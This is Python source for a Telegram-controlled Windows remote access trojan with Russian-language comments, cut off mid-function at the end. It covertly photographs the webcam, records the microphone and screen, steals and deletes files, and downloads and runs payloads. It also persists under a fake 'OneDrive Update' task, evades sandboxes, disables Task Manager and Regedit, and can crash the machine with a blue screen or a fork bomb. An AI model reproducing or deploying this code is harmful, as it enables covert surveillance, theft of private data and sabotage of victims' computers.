# -*- coding: utf8 -*-

import re
import os
import sys
import cv2
import wave
import glob
import time
import shutil
import telebot
import sqlite3
import pyaudio
import requests
import platform
import pyperclip
import subprocess
import win32crypt
import json,base64
import urllib.request
from PIL import ImageGrab
from telebot import types
from telebot import util
from telebot import apihelper
from ctypes import *
from ctypes.wintypes import *
from urllib.error import HTTPError
from subprocess import Popen, PIPE
from os import system



#Токен/Айди
TelegramToken = 'TOKEN'
TelegramChatID = 'ID'

#Прокси
Proxy = False
Ip = 'Ip'
Port = 'Port'


#Запускать от имени администратора
AdminRightsRequired = False


#Отключать Диспетчер Задач при первом запуске
DisableTaskManager = False
#Отключать Редактор Реестра при первом запуске
DisableRegistryTools = False


#Добавлять в автозагрузку при первом запуске
AutorunEnabled = False
#Директория для копирования файла
InstallPath = 'C:\\ProgramData'
#Имя файла в автозагрузке
AutorunName = 'OneDrive Update'
#Имя процесса в диспетчере задач
ProcessName = 'System'


#Выводить сообщение при запуске
DisplayMessageBox = False
#Заголовок сообщения
MessageHeader = 'MessageHeader'
#Сообщение
Message = 'Message'


#Защита процесса от завершения и удаления
ProcessBSODProtectionEnabled = False
#Сканировать на наличие заблокированных процессов
MakeBSODWhenProcessStarted = False
#Список заблокированных процессов (BSoD при открытии)
BlacklistedProcesses = (
    'taskmgr.exe',
    'processhacker.exe',
    'regedit.exe',
    'mmc.exe',
    'perfmon.exe'
)



bot = telebot.TeleBot(TelegramToken, threaded=True)
bot.worker_pool = util.ThreadPool(num_threads=50)

menu = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/1\n<<')
button2 = types.KeyboardButton('/2\n>>')
button3 = types.KeyboardButton('/Screen\n🖼')
button4 = types.KeyboardButton('/Webcam\n📸')
button5 = types.KeyboardButton('/Video\n🎥')
button6 = types.KeyboardButton('/Audio\n🎙')
button7 = types.KeyboardButton('/Power\n🔴')
button8 = types.KeyboardButton('/Autorun\n🔵')
menu.row(button1, button3, button2)
menu.row(button4, button5, button6)
menu.row(button7, button8)

main2 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Выключить - ⛔️', callback_data='shutdown')
button2 = types.InlineKeyboardButton('Перезагрузить - ⭕️', callback_data='reboot')
button3 = types.InlineKeyboardButton('Выйти из системы - 💢', callback_data='logoff')
button4 = types.InlineKeyboardButton('Синий экран смерти - 🌀', callback_data='bsod')
button5 = types.InlineKeyboardButton('« Назад', callback_data='cancel')
main2.row(button1)
main2.row(button2)
main2.row(button3)
main2.row(button4)
main2.row(button5)

main3 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Сохранить - 📥', callback_data='startup')
button2 = types.InlineKeyboardButton('Удалить - ♻️', callback_data='uninstall')
button3 = types.InlineKeyboardButton('« Назад', callback_data='cancel')
main3.row(button1)
main3.row(button2)
main3.row(button3)

main4 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Да, удалить', callback_data='confirm')
button2 = types.InlineKeyboardButton('Не удалять', callback_data='cancel')
button3 = types.InlineKeyboardButton('« Назад', callback_data='cancel')
main4.row(button1)
main4.row(button2)
main4.row(button3)

main5 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/3\n<<')
button2 = types.KeyboardButton('/Screen\n🖼')
button3 = types.KeyboardButton('/4\n>>')
button4 = types.KeyboardButton('/Files\n💾')
button5 = types.KeyboardButton('/Tasklist\n📋')
button6 = types.KeyboardButton('/Taskkill\n📝')
main5.row(button1, button2, button3)
main5.row(button4)
main5.row(button5, button6)

main6 = types.InlineKeyboardMarkup()
button1 = types.InlineKeyboardButton('Остановить все процессы', callback_data='taskkill all')
button2 = types.InlineKeyboardButton('Отключить диспетчер задач', callback_data='disabletaskmgr')
main6.row(button1)
main6.row(button2)

main7 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/CD\n🗂')
button2 = types.KeyboardButton('/Upload\n📡')
button3 = types.KeyboardButton('/ls\n📄')
button4 = types.KeyboardButton('/Remove\n🗑')
button5 = types.KeyboardButton('/Download\n📨')
button6 = types.KeyboardButton('/Run\n📌')
button7 = types.KeyboardButton('/Cancel')
main7.row(button1, button2, button3)
main7.row(button4, button5, button6)
main7.row(button7)

main8 = types.ReplyKeyboardMarkup()
button1 = types.KeyboardButton('/5\n<<')
button2 = types.KeyboardButton('/Screen\n🖼')
button3 = types.KeyboardButton('/6\n>>')
button4 = types.KeyboardButton('/Message\n💬')
button5 = types.KeyboardButton('/Speak\n📢')
button6 = types.KeyboardButton('/OpenURL\n🌐')
button7 = types.KeyboardButton('/Wallpapers\n🧩')
button8 = types.KeyboardButton('/ForkBomb\n⏱')
main8.row(button1, button2, button3)
main8.row(button4, button5)
main8.row(button6, button7, button8)


# Variables

ProgramFiles = os.environ['ProgramW6432']+'\\'
ProgramFiles86 = os.environ['ProgramFiles(x86)']+'\\'
ProgramData = os.environ['ProgramData']+'\\'
Temp = os.environ['TEMP']+'\\'

Expansion = os.path.splitext(os.path.basename(sys.argv[0]))[1]
CurrentName = os.path.basename(sys.argv[0])
CurrentPath = sys.argv[0]
ProcessName = ProcessName+Expansion


# AntiBot (VirusTotal)

for file in glob.glob('C:\\Users\\John\\Desktop\\foobar.*'):
 sys.exit()
for file in glob.glob('C:\\Users\\Peter Wilson\\Desktop\\Microsoft Word 2010.lnk'):
 sys.exit()
for file in glob.glob('C:\\Users\\Lisa\\Desktop'):
 sys.exit()


# Detect installed antivirus software

if os.path.exists(ProgramFiles+'Windows Defender'):
   av = 'Windows Defender'
if os.path.exists(ProgramFiles+'AVAST Software\\Avast'):
   av = 'Avast'
if os.path.exists(ProgramFiles+'AVG\\Antivirus'):
   av = 'AVG'
if os.path.exists(ProgramFiles86+'Avira\\Launcher'):
   av = 'Avira'
if os.path.exists(ProgramFiles86+'IObit\\Advanced SystemCare'):
   av = 'Advanced SystemCare'
if os.path.exists(ProgramFiles+'Bitdefender Antivirus Free'):
   av = 'Bitdefender'
if os.path.exists(ProgramFiles+'DrWeb'):
   av = 'Dr.Web'
if os.path.exists(ProgramFiles+'ESET\\ESET Security'):
   av = 'ESET'
if os.path.exists(ProgramFiles86+'Kaspersky Lab'):
   av = 'Kaspersky'
if os.path.exists(ProgramFiles86+'360\\Total Security'):
   av = '360 Total Security'


"""Script functions"""


# Proxy Setting

def SetProxy(Ip, Port):
 apihelper.proxy = {'https': 'socks5://{}:{}'.format(Ip,Port)}


# Run as administrator

def WhileRunAS(File):
 while True:
  try:
   os.startfile(File, 'runas')
  except:
   pass
  else:
   break


# Check if the script is run as administrator

def AdminChecker():
 try:
  admin = os.getuid() == 0
 except AttributeError:
  admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 if admin is False:
  sys.exit()


# Disabling Task Manager and Regedit

def RegeditDisableTaskManager():
 directory = ProgramData
 with open(os.path.join(directory, 'DisableTaskManager.bat'), 'w') as OPATH:
   OPATH.writelines([
       'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f'])

def RegeditDisableRegistryTools():
 directory = ProgramData
 with open(os.path.join(directory, 'DisableRegistryTools.bat'), 'w') as OPATH:
   OPATH.writelines([
       'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f'])


# Adding a script to startup

def AddToAutorun(AutorunName, InstallPath, ProcessName):
 directory = Temp
 with open(os.path.join(directory, 'AutorunEnabled.bat'), 'w') as OPATH:
   OPATH.writelines([
       'schtasks /create /f /sc onlogon /rl highest /tn "'+AutorunName+'" /tr "'+InstallPath+'\\'+ProcessName+'"'])
 while True:
  try:
   os.startfile(Temp+'AutorunEnabled.bat', 'runas')
  except:
   pass
  else:
   shutil.copy2(CurrentPath, r''+InstallPath+'\\'+ProcessName)
   ctypes.windll.kernel32.SetFileAttributesW(InstallPath+'\\'+ProcessName, 2)
   break


# MessageBox Output

def MessageBox(Message):
 ctypes.windll.user32.MessageBoxW(0, Message, u''+MessageHeader, 0x10)


# Protect process with BSoD (if killed).

def SetProtection():
 windll.ntdll.RtlAdjustPrivilege(20, 1, 0, byref(c_bool()))
 windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0

def UnsetProtection():
 windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0

if ProcessBSODProtectionEnabled is True:
 try:
  admin = os.getuid() == 0
 except AttributeError:
  admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 if admin is False:
  WhileRunAS(CurrentPath)
  SetProtection()
 if admin is True:
  SetProtection()

if ProcessBSODProtectionEnabled is True:
 Argument = none_stop = True
 AdminChecker()
else:
 Argument = ''


# BSoD if a forbidden process is open

def List():
 processes = []
 process = subprocess.check_output("@chcp 65001 1> NUL && @TASKLIST /FI \"STATUS eq RUNNING\" | find /V \"Image Name\" | find /V \"=\"",
     shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode(encoding="utf8", errors="strict")
 for processNames in process.split(' '):
  if ".exe" in processNames:
   proc = processNames.replace("K\r\n", '').replace("\r\n", '')
   processes.append(proc)
 return processes

def CheckProcess():
 for process in List():
  if process.lower() in BlacklistedProcesses:
   return True
 return False


"""Functions"""


# Takes a screenshot

def TakeScreenshot(File):
 Screen = ImageGrab.grab()
 Screen.save(File)


# Takes a photo from a webcam

def TakeWebcamPhoto(File):
 cap = cv2.VideoCapture(0)
 for i in range(30):
    cap.read()
 ret, frame = cap.read()
 cv2.imwrite(File, frame)
 cap.release()


# Records webcam video

def VideoRecorder(Seconds, File):
 capture_duration = float(Seconds)
 cap = cv2.VideoCapture(0)
 fourcc = cv2.VideoWriter_fourcc(*'XVID')
 out = cv2.VideoWriter(File,fourcc, 20.0, (640,480))
 start_time = time.time()
 while( int(time.time() - start_time) < capture_duration ):
    ret, frame = cap.read()
    if ret==True:
        frame = cv2.flip(frame,1)
        out.write(frame)
    else:
        break
 cap.release()
 out.release()
 cv2.destroyAllWindows()


#Records audio from a microphone

def AudioRecorder(Seconds, File):
 CHUNK = 1024
 FORMAT = pyaudio.paInt16
 CHANNELS = 2
 RATE = 44100
 RECORD_SECONDS = float(Seconds)
 WAVE_OUTPUT_FILENAME = File
 p = pyaudio.PyAudio()
 stream = p.open(format=FORMAT,
                channels=CHANNELS,
                rate=RATE,
                input=True,
                frames_per_buffer=CHUNK)
 frames = []
 for i in range(0, int(RATE/CHUNK * RECORD_SECONDS)):
    data = stream.read(CHUNK)
    frames.append(data)
 stream.stop_stream()
 stream.close()
 p.terminate()
 wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
 wf.setnchannels(CHANNELS)
 wf.setsampwidth(p.get_sample_size(FORMAT))
 wf.setframerate(RATE)
 wf.writeframes(b''.join(frames))
 wf.close()


# Sends a message

def SendMessage(call, text):
 bot.edit_message_text(chat_id=call.message.chat.id,
 message_id=call.message.message_id, text=text, parse_mode="Markdown")


# Turns off the computer

def Shutdown():
 system('@shutdown /s /f /t 0')


# Restarts computer

def Reboot():
 system('@shutdown /r /f /t 0')

# Ends user session

def Logoff():
 system('@shutdown /f /l')


# Blue screen of death

def BSoD():
 ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(c_bool()))
 ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, byref(DWORD()))


# Gets a list of active processes

def ProcessList():
 Calling = Popen('tasklist', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE).stdout.readlines()
 Process = [Calling[i].decode('cp866', 'ignore').split()[0].split('.exe')[0] for i in range(3,len(Calling))]
 strProcess = '\n'.join(Process)
 return strProcess


# Ends the selected process

def KillProcess(Process):
 subprocess.Popen('taskkill /f /im '+Process+'.exe')


# Gets the title of the active window

def WindowTitle():
 hWnd = windll.user32.GetForegroundWindow()
 length = windll.user32.GetWindowTextLengthW(hWnd)
 buf = create_unicode_buffer(length + 1)
 windll.user32.GetWindowTextW(hWnd, buf, length + 1)
 if buf.value:
     return buf.value
 else:
     return None


# Displays a message on the screen

def SendMessageBox(Message):
 ctypes.windll.user32.MessageBoxW(0, Message, u'', 0x40)


# Opens a browser link

def OpenBrowser(URL):
 if not URL.startswith('http'):
     URL = 'http://' + URL
 return system(f'@start {URL} > NUL')


# Receive a photo from a Telegram Chat

def GetPhoto(Photo, command):
 file_info = bot.get_file(command.photo[len(command.photo)-1].file_id)
 downloaded_file = bot.download_file(file_info.file_path)
 src = ProgramData+'Files\\'+file_info.file_path;
 with open(src, 'wb') as new_file:
   new_file.write(downloaded_file)


# Sets a photo on the desktop wallpaper

def SetWallpapers(Photo):
 ctypes.windll.user32.SystemParametersInfoW(20, 0, ProgramData+'Files\\'+Photo.file_path, 0)


# Speaks text

def SpeakText(Text):
 from win32com.client import constants, Dispatch
 speaker = Dispatch('SAPI.SpVoice')
 speaker.Speak(Text)
 del speaker


# Infinitely creates copies of selected programs

def ForkBomb():
 while True:
  try:
   os.startfile('cmd.exe')
   os.startfile('calc.exe')
   os.startfile('notepad.exe')
  except:
   pass


# Sets text to clipboard

def SetClipboard(Text):
 pyperclip.copy(Text)


# Get text from clipboard

def GetClipboard():
 return pyperclip.paste()


# Blocks mouse and keyboard movements

def Block(Seconds):
 windll.user32.BlockInput(True)
 time.sleep(Seconds)
 windll.user32.BlockInput(False)



"""Function handlers"""



if Proxy is True:
 SetProxy(Ip, Port)


if AdminRightsRequired is True:
 try:
  admin = os.getuid() == 0
 except AttributeError:
  admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 if admin is False:
  WhileRunAS(CurrentPath)
  print('[+] › '+CurrentName+' открыт от имени администратора!\n')


if AdminRightsRequired is True:
 AdminChecker()


if DisableTaskManager is True:
 try:
  if os.path.exists(ProgramData+'DisableTaskManager.bat'):
   pass
  else:
   RegeditDisableTaskManager()
   WhileRunAS(ProgramData+'DisableTaskManager.bat')
   print('[+] › Диспетчер задач отключен!\n')
 except:
  pass


if DisableRegistryTools is True:
 try:
  if os.path.exists(ProgramData+'DisableRegistryTools.bat'):
   pass
  else:
   time.sleep(1)
   RegeditDisableRegistryTools()
   WhileRunAS(ProgramData+'DisableRegistryTools.bat')
   print('[+] › Редактор реестра отключен!\n')
 except:
  pass


if AutorunEnabled is True:
 try:
  if os.path.exists(InstallPath+'\\'+ProcessName):
   pass
  else:
   AddToAutorun(AutorunName, InstallPath, ProcessName)
   print('[+] › '+CurrentName+' ‹ скопирован в автозагрузку › '+InstallPath+'\\'+ProcessName+'\n')
 except:
  pass


if DisplayMessageBox is True:
 try:
  if os.path.exists(Temp+'MessageBox'):
   pass
  else:
   open(Temp+'MessageBox', 'a').close()
   MessageBox(Message)
   print('[+] › Сообщение отправлено!\n')
 except:
  pass


if ProcessBSODProtectionEnabled is True:
 try:
  admin = os.getuid() == 0
 except AttributeError:
  admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 if admin is False:
  WhileRunAS(CurrentPath)
  SetProtection()
  print('[+] › Защита процесса активирована!')
 if admin is True:
  SetProtection()
  print('[+] › Защита процесса активирована!')


"""Calling functions through commands"""


while True:
 try:
  try:
   admin = os.getuid() == 0
  except AttributeError:
   admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
  if admin is True:
   Online = '🔘 Online!'
  else:
   Online = '🟢 Online!'

  r = requests.get('http://ip.42.pl/raw')
  IP = r.text
  bot.send_message(TelegramChatID, 
  '\n'+Online+'\n'
  '\nPC » '+os.getlogin()+
  '\nOS » '+platform.system()+' '+platform.release()+
  '\n'
  '\nAV » '+av+
  '\n'
  '\nIP » '+IP,
  reply_markup=menu)

  if os.path.exists(ProgramData+'Files'):
    pass
  else:
    os.makedirs(ProgramData+'Files')
    os.makedirs(ProgramData+'Files\\Documents')
    os.makedirs(ProgramData+'Files\\Photos')
 except:
   print('[-] › Нет подключения')
 else:
   print('[+] › Подключено')
   break


if MakeBSODWhenProcessStarted is True:
 while True:
  try:
   if CheckProcess() is True:
    BSoD()
  except:
   pass


@bot.message_handler(regexp='/Screen')
def Screen(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_photo')
  File = Temp+'Screenshot.jpg'
  TakeScreenshot(File)
  Screen = open(File, 'rb')
  bot.send_photo(command.chat.id, Screen)
 except:
  pass


@bot.message_handler(regexp='/Webcam')
def Webcam(command):
 try:
  bot.send_chat_action(command.chat.id, 'upload_photo')
  File = Temp+'Webcam.jpg'
  TakeWebcamPhoto(File)
  Webcam = open(File, 'rb')
  bot.send_photo(command.chat.id, Webcam)
 except:
  bot.send_message(command.chat.id, '*Камера не найдена*', parse_mode="Markdown")


@bot.message_handler(regexp='/Video')
def Video(command):
 try:
  Seconds = re.split('/Video ', command.text, flags=re.I)[1]
  bot.send_message(command.chat.id, '*Записываем...*', parse_mode="Markdown")
  bot.send_chat_action(command.chat.id, 'upload_video')
  try:
   File = Temp+'Video.mp4'
   VideoRecorder(Seconds, File)
   Video = open(File, 'rb')
   bot.send_animation(command.chat.id, Video)
  except ValueError:
   bot.send_message(command.chat.id, '*Ошибка значения*', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, '*Камера не найдена*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Укажите длительность записи\n\n› /Video*', parse_mode="Markdown")


@bot.message_handler(regexp='/Audio')
def Audio(command):
 try:
  Seconds = re.split('/Audio ', command.text, flags=re.I)[1]
  bot.send_message(command.chat.id, '*Записываем...*', parse_mode="Markdown")
  bot.send_chat_action(command.chat.id, 'record_audio')
  try:
   File = Temp+'Audio.wav'
   AudioRecorder(Seconds, File)
   Audio = open(File, 'rb')
   bot.send_voice(command.chat.id, Audio)
  except ValueError:
   bot.send_message(command.chat.id, '*Ошибка значения*', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, '*Не удалось записать аудио*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Укажите длительность записи\n\n› /Audio*', parse_mode="Markdown")


@bot.callback_query_handler(func=lambda call: True)
def callback_inline(command):
 if command.message:
  if command.data == 'shutdown':
   try:
    SendMessage(command, '*Компьютер выключен!*')
    Shutdown()
   except:
    pass


  if command.data == 'reboot':
   try:
    SendMessage(command, '*Компьютер перезагружен!*')
    Reboot()
   except:
    pass


  if command.data == 'logoff':
   try:
    SendMessage(command, '*Сеанс пользователя завершен!*')
    Logoff()
   except:
    pass


  if command.data == 'bsod':
   try:
    SendMessage(command, '*BSoD активирован!*')
    BSoD()
   except:
    pass


  if command.data == 'startup':
   try:
    if os.path.exists(InstallPath+'\\'+ProcessName):
     SendMessage(command, '*'+ProcessName+'* уже находится в автозагрузке!')
    else:
     AddToAutorun(AutorunName, InstallPath, ProcessName)
     os.startfile(InstallPath+'\\'+ProcessName)
     SendMessage(command, '*'+ProcessName+'* скопирован в автозагрузку!')
   except:
    SendMessage(command, '*Ошибка*')


  if command.data == 'uninstall':
   bot.edit_message_text(chat_id=command.message.chat.id,
   message_id=command.message.message_id, text='*Вы уверены?*', reply_markup=main4, parse_mode="Markdown")


  if command.data == 'confirm':
   try:
    SendMessage(command, '*'+CurrentName+'* удален!')
    UnsetProtection()
    ctypes.windll.kernel32.SetFileAttributesW(CurrentPath, 0)
    ctypes.windll.kernel32.SetFileAttributesW(InstallPath+'\\'+ProcessName, 0)
    directory = Temp
    with open(os.path.join(directory, 'Uninstaller.bat'), 'w') as OPATH:
      OPATH.writelines(['taskkill /f /im "'+CurrentName+'"\n', 
                        'schtasks /delete /f /tn "'+AutorunName+'"\n', 
                        'del /s /q "'+CurrentPath+'"\n',
                        'del /s /q "'+InstallPath+'\\'+ProcessName+'"\n',
                        'rmdir /s /q "'+ProgramData+'Files'+'"'])
    WhileRunAS(Temp+'Uninstaller.bat')
   except:
    SendMessage(command, '*Ошибка*')


  if command.data == 'taskkill all':
   try:
    SendMessage(command, '*Останавливаем...*')
    directory = Temp
    with open(os.path.join(directory, 'taskkill.bat'), 'w') as OPATH:
      OPATH.writelines([
        'if "%~1"=="" (set "x=%~f0"& start "" /min "%comspec%" /v/c "!x!" any_word & exit /b)\n', 
        'taskkill /f /fi "USERNAME eq %username%" /fi "IMAGENAME ne explorer.exe USERNAME eq %username%" /fi "IMAGENAME ne "'+CurrentName+'"'])
    os.startfile(Temp+'taskkill.bat')
    SendMessage(command, '*Все процессы остановлены!*')
   except:
    pass


  if command.data == 'disabletaskmgr':
   try:
    if os.path.exists(ProgramData+'DisableTaskManager.bat'):
      SendMessage(command, '*Диспетчер задач уже отключен!*')
    else:
     RegeditDisableTaskManager()
     WhileRunAS(ProgramData+'DisableTaskManager.bat')
     SendMessage(command, '*Диспетчер задач отключен!*')
   except:
    pass


  if command.data == 'cancel':
    SendMessage(command, '`...`')


@bot.message_handler(regexp='/CD')
def CD(command):
 try:
  path = re.split('/CD ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  os.chdir(path)
  bot.send_message(command.chat.id, '*Директория изменена*\n\n`'+os.getcwd()+'`', parse_mode="Markdown")
 except FileNotFoundError:
  bot.send_message(command.chat.id, '*Директория не найдена*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Текущая директория*\n\n`'+os.getcwd()+'`\n\n*Имя пользователя*\n\n`'+os.getlogin()+'`', parse_mode="Markdown")


@bot.message_handler(regexp='/ls')
def ls(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  dirs = '\n``'.join(os.listdir())
  bot.send_message(command.chat.id, '`'+os.getcwd() + '`\n\n'+'`' + dirs+'`', parse_mode="Markdown")
 except:
  try:
   dirse = '\n'.join(os.listdir())
   splitted_text = util.split_string(dirse, 4096)
   for dirse in splitted_text:
     bot.send_message(command.chat.id, '`'+dirse+'`', parse_mode="Markdown")
  except PermissionError:
   bot.send_message(command.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
  except:
   pass


@bot.message_handler(commands=['Remove', 'remove'])
def Remove(command):
 try:
  File = re.split('/Remove ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  created = os.path.getctime(os.getcwd()+'\\'+File)
  year,month,day,hour,minute,second=time.localtime(created)[:-3]
  def convert_bytes(num):
      for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
          if num < 1024.0:
              return "%3.1f %s" % (num, x)
          num /= 1024.0
  def file_size(file_path):
      if os.path.isfile(file_path):
          file_info = os.stat(file_path)
          return convert_bytes(file_info.st_size)
  bot.send_message(command.chat.id, 
    'Файл *'+msg+'* удален!' 
    '\n' 
    '\nСоздан » %02d/%02d/%d'%(day,month,year)+
    '\nРазмер » '+file_size(os.getcwd()+'\\'+File),
    parse_mode="Markdown")
  os.remove(os.getcwd()+'\\'+File)
 except:
  try:
   created = os.path.getctime(os.getcwd()+'\\'+File)
   year,month,day,hour,minute,second=time.localtime(created)[:-3]
   folder = os.getcwd()+'\\'+File
   folder_size = 0
   for (path, dirs, files) in os.walk(folder):
     for file in files:
       filename = os.path.join(path, file)
       folder_size += os.path.getsize(filename)
   files = folders = 0
   for _, dirnames, filenames in os.walk(os.getcwd()+'\\'+File):
       files += len(filenames)
       folders += len(dirnames)
   shutil.rmtree(os.getcwd()+'\\'+File)
   bot.send_message(command.chat.id, 
     'Папка *'+File+'* удалена!'
     '\n'
     '\nСоздана » %02d/%02d/%d'%(day,month,year)+
     '\nРазмер » %0.1f MB' % (folder_size/(1024*1024.0))+
     '\nСодержало » '+"{:,} Файлов, {:,} Папок".format(files, folders),
     parse_mode="Markdown")
  except FileNotFoundError:
   bot.send_message(command.chat.id, '*Файл не найден*', parse_mode="Markdown")
  except PermissionError:
   bot.send_message(command.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, '*Введите название файла\n\n› /Remove • /RemoveAll*', parse_mode="Markdown")


@bot.message_handler(commands=['RemoveAll', 'removeall'])
def RemoveAll(command):
 try:
  bot.send_message(command.chat.id, '*Удаляем...*', parse_mode="Markdown")
  folder = os.getcwd()
  folder_size = 0
  for (path, dirs, files) in os.walk(folder):
    for file in files:
      filename = os.path.join(path, file)
      folder_size += os.path.getsize(filename)
  files = folders = 0
  for _, dirnames, filenames in os.walk(os.getcwd()):
      files += len(filenames)
      folders += len(dirnames)
  a = (len(glob.glob('*')))
  try:
   for file in glob.glob('*.*'):
    if os.path.isfile(file):
      os.remove(file)
   for directory in glob.glob('*/'):
    if os.path.exists(directory):
      shutil.rmtree(directory)
  except PermissionError:
     pass
  b = (len(glob.glob('*')))
  c = (a - b)
  bot.send_message(command.chat.id,
     'Удалено *'+str(c)+'* файлов из *'+str(a)+'*!'
     '\n'
     '\nРазмер » %0.1f MB' % (folder_size/(1024*1024.0))+
     '\nСодержало » '+"{:,} Файлов, {:,} Папок".format(files, folders),
     parse_mode="Markdown")
 except:
  pass


@bot.message_handler(regexp='/Upload')
def Upload(command):
 try:
  File = re.split('/Upload ', command.text, flags=re.I)[1]
  req = urllib.request.Request(File, method='HEAD')
  r = urllib.request.urlopen(req)
  file_name = ProgramData+'Files\\'+r.info().get_filename()
  bot.send_message(command.chat.id, '*Скачиваем файл...*', parse_mode="Markdown")
  urllib.request.urlretrieve(File, file_name)
  bot.reply_to(command, '*Файл загружен на компьютер!*\n\n`'+file_name+'`', parse_mode="Markdown")
 except urllib.error.HTTPError as err:
  bot.send_message(command.chat.id, '*Ссылка не найдена*', parse_mode="Markdown")
 except ValueError:
  bot.send_message(command.chat.id, '*Вставьте рабочую ссылку*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Отправьте файл или вставьте URL-Ссылку\n\n› /Upload*', parse_mode="Markdown")


@bot.message_handler(content_types=['document'])
def Document(command):
 try:
  File = bot.get_file(command.document.file_id)
  bot.send_message(command.chat.id, '*Загружаем...*', parse_mode="Markdown")
  downloaded_file = bot.download_file(File.file_path)
  src = ProgramData+'Files\\'+File.file_path;
  with open(src, 'wb') as new_file:
   new_file.write(downloaded_file)
  bot.reply_to(command, '*Файл загружен на компьютер!*\n\n`C:/ProgramData/Files/'+File.file_path+'`', parse_mode="Markdown")
 except FileNotFoundError:
  bot.reply_to(command, '*Формат файла не поддерживается*', parse_mode="Markdown")
 except:
  bot.reply_to(command, '*Вы не можете загрузить файл больше 20МБ*', parse_mode="Markdown")


@bot.message_handler(regexp='/Download')
def download(command):
 try:
  File = re.split('/Download ', command.text, flags=re.I)[1]
  download = open(os.getcwd()+'\\'+File, 'rb')
  bot.send_message(command.chat.id, '*Отправляем...*', parse_mode="Markdown")
  bot.send_chat_action(command.chat.id, 'upload_document')
  bot.send_document(command.chat.id, download)
 except FileNotFoundError:
  bot.send_message(command.chat.id, '*Файл не найден*', parse_mode="Markdown")
 except:
  try:
   msg = re.split('/Download ', command.text, flags=re.I)[1]
   bot.send_message(command.chat.id, '*Собираем...*', parse_mode="Markdown")
   shutil.make_archive(ProgramData+File,
                           'zip',
                           os.getcwd()+'\\',
                           File)
   bot.send_chat_action(command.chat.id, 'upload_document')
   file = open(ProgramData+msg+'.zip', 'rb')
   bot.send_message(command.chat.id, '*Отправляем...*', parse_mode="Markdown")
   bot.send_document(command.chat.id, file)
   file.close()
   os.remove(ProgramData+File+'.zip')
  except PermissionError:
   bot.send_message(command.chat.id, '*Отказано в доступе*', parse_mode="Markdown")
  except:
   try:
    file.close()
    os.remove(ProgramData+File+'.zip')
    bot.send_message(command.chat.id, '*Вы не можете скачать файл больше 50МБ*', parse_mode="Markdown")
   except:
    bot.send_message(command.chat.id, '*Введите название файла\n\n› /Download*', parse_mode="Markdown")


@bot.message_handler(commands=['Run', 'run'])
def Run(command):
 try:
  File = re.split('/Run ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  os.startfile(os.getcwd()+'\\'+File)
  bot.send_message(command.chat.id, 'Файл *'+File+'* открыт!', parse_mode="Markdown")
 except FileNotFoundError:
  bot.send_message(command.chat.id, '*Файл не найден*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Введите название файла\n\n› /Run • /RunAS*', parse_mode="Markdown")



@bot.message_handler(commands=['RunAS', 'runas'])
def RunAS(command):
 try:
  File = re.split('/RunAS ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  WhileRunAS(os.getcwd()+'\\'+File)
  bot.send_message(command.chat.id, 'Файл *'+File+'* открыт!', parse_mode="Markdown")
 except FileNotFoundError:
  bot.send_message(command.chat.id, '*Файл не найден*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Введите название файла\n\n› /Run • /RunAS*', parse_mode="Markdown")


@bot.message_handler(regexp='/Tasklist')
def Tasklist(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  ProcessList()
  bot.send_message(command.chat.id, '`'+ProcessList()+'`', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*Не удалось получить список процессов*', parse_mode="Markdown")


@bot.message_handler(regexp='/Taskkill')
def Taskkill(command):
 try:
  Process = re.split('/Taskkill ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  KillProcess(Process)
  bot.send_message(command.chat.id, 'Процесс *'+Process+"* остановлен!", parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, 
  '*Введите название процесса'
  '\n'
  '\n› /Taskkill'
  '\n'
  '\nАктивное окно*'
  '\n'
  '\n`'+WindowTitle()+'`',
  reply_markup=main6, parse_mode="Markdown")


@bot.message_handler(regexp='/Message')
def Message(command):
 try:
  Message = re.split('/Message ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  bot.reply_to(command, '*Сообщение отправленно!*', parse_mode="Markdown")
  SendMessageBox(Message)
 except:
